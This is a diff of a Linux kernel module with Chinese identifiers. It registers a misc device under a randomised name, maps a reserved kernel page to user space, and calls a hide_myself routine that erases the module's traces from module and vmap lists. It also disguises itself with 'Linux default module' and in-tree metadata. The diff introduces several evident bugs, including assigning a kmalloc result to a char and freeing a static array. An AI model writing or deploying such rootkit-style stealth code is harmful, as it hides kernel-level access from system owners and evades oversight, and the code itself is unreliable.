@@ -10,6 +10,12 @@
 //#include <linux/kallsyms.h>
 //#include <linux/list.c>
 #include <linux/vmalloc.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/random.h>
+static char node_name[32];
+static char nod_name;
 
 #ifndef VM_RESERVED
 #define VM_RESERVED (VM_DONTEXPAND | VM_DONTDUMP)
@@ -125,6 +131,13 @@ static int 映射内存(struct file *file, struct vm_area_struct *vma)
 	return 0;
 }
 
+/*struct timer_list timer;
+// 模拟重体力劳动
+static void timer_func(unsigned long data)
+{
+	udelay(1000);
+	mod_timer(&timer, jiffies + 10);
+}*/
 static struct file_operations dev_fops = {
 	.owner = THIS_MODULE,
 	.open = 打开操作,
@@ -136,23 +149,15 @@ static struct file_operations dev_fops = {
 
 struct miscdevice misc = {
 	.minor = MISC_DYNAMIC_MINOR,
-	.name = DEV_FILENAME,
+    .name= node_name,
 	.fops = &dev_fops,
-};
-/*struct timer_list timer;
-// 模拟重体力劳动
-static void timer_func(unsigned long data)
-{
-	udelay(1000);
-	mod_timer(&timer, jiffies + 10);
-}*/
-
+	};
 static void __init hide_myself(void)
 {
-	//struct vmap_area *va, *vtmp;
+	struct vmap_area *va, *vtmp;
 	struct module_use *use, *tmp;
-	//struct list_head *_vmap_area_list;
-	//struct rb_root *_vmap_area_root;
+	struct list_head *_vmap_area_list;
+	struct rb_root *_vmap_area_root;
 
 /*_vmap_area_list = (struct list_head *)kallsyms_lookup_name("vmap_area_list");
 	_vmap_area_root = (struct rb_root *)kallsyms_lookup_name("vmap_area_root");
@@ -176,24 +181,8 @@ static void __init hide_myself(void)
 	}
 }
 
-int __init misc_dev_init(void)
+/*int __init misc_dev_init(void)
 {
-	int ret;
-	printk("[+] 初始化驱动");
-	映射区 = (struct 桥梁 *)kmalloc(PAGE_SIZE, GFP_KERNEL);
-	SetPageReserved(virt_to_page(映射区));
-//	list_del_init(&THIS_MODULE);
-  // kobject_del(&THIS_MODULE);
-	ret = misc_register(&misc);
-	hide_myself();
-/*	init_timer(&timer);
-	timer.expires = jiffies + 20;
-	timer.function = timer_func;
-	add_timer(&timer);*/
-
-	// 模拟依赖。我们需要在依赖关系中也隐藏掉该模块的行踪
-//	printk("address:%p   this:%p\n", nf_conntrack_in, THIS_MODULE);
-
 	return 0;
 //	return ret;
 }
@@ -208,11 +197,65 @@ void __exit misc_dev_exit(void)
 	misc_deregister(&misc);
 //   del_timer_sync(&timer);
 
-}
+}*/
 // hidemyself.c
 
-module_init(misc_dev_init);
-module_exit(misc_dev_exit);
+static int __init random_node_init(void)
+{   char random_suffix[4];
+    get_random_bytes(random_suffix, sizeof(random_suffix));
+    // 将随机数转换为字符串
+    char random_str[sizeof(random_suffix) * 2 + 1];
+    int i;
+    for (i = 0; i < sizeof(random_suffix); i++) {
+        snprintf(random_str + i * 2, 3, "%02x", random_suffix[i]);
+    }
+    // 生成节点名称
+    nod_name = kmalloc(strlen("random_node_") + sizeof(random_str), GFP_KERNEL);
+    if (!nod_name) {
+        printk(KERN_ERR "Failed to allocate memory\n");
+        return -ENOMEM;
+    }
+    strcpy(node_name, "mhi_");
+    strcat(node_name, random_str);
+    // 输出节点名称
+    
+    	int ret;
+	printk("[+] 初始化驱动");
+	映射区 = (struct 桥梁 *)kmalloc(PAGE_SIZE, GFP_KERNEL);
+	SetPageReserved(virt_to_page(映射区));
+//	list_del_init(&THIS_MODULE);
+  // kobject_del(&THIS_MODULE);
+//  random_node_init();
+	ret = misc_register(&misc);
+	hide_myself();
+/*	init_timer(&timer);
+	timer.expires = jiffies + 20;
+	timer.function = timer_func;
+	add_timer(&timer);*/
+
+	// 模拟依赖。我们需要在依赖关系中也隐藏掉该模块的行踪
+//	printk("address:%p   this:%p\n", nf_conntrack_in, THIS_MODULE);
+    printk(KERN_INFO "Random node name: %s\n", node_name);
+    // 在此处添加模块的其他初始化代码
+    return 0;
+}
+static void __exit random_node_exit(void)
+{	printk("[+] 卸载驱动");
+	ClearPageReserved(virt_to_page(映射区));
+
+	kfree(映射区);
+
+	misc_deregister(&misc);
+
+    // 在此处添加模块的清理代码
+    // 释放节点名称的内存
+    kfree(node_name);
+    printk(KERN_INFO "Random node module unloaded\n");
+}
+module_init(random_node_init);
+module_exit(random_node_exit);
+/*module_init(misc_dev_init);
+module_exit(misc_dev_exit);*/
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Linux default module");
 MODULE_INFO(intree, "Y");
